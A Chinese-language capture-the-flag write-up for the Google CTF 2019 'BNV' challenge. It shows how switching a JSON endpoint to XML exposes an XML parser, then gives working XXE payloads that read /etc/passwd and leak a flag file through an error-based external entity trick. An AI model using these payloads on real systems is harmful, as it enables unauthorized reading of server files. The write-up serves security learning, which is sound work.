# BNV

[English Version](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)

這題題目會把送出的選項編碼成點字 

(https://www.pharmabraille.com/pharmaceutical-braille/the-braille-alphabet/)

背後是用JS送到`/api/serach`，然後送的格式是`application/json`

如果嘗試把`Content-type`改成`application/xml`

會發現噴XML Parse Error

所以可以知道對面Server支援XML格式的輸入

嘗試XXE會發現沒有回顯:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]> 
<message>&xxe;</message>
```

可以發現如果是存在的檔案會回: `No Result`

不存在的檔案會噴Error

代表XML Parse的過程的確有讀到檔案

所以最後目標就是把內容帶出來

<br>

這裡可以利用前陣子很火的Error based XXE的方式

把內容夾帶到 Error message 中帶出來

payload:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<message>a</message>
```

![](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/bnv.png)

flag: `CTF{0x1033_75008_1004x0}`


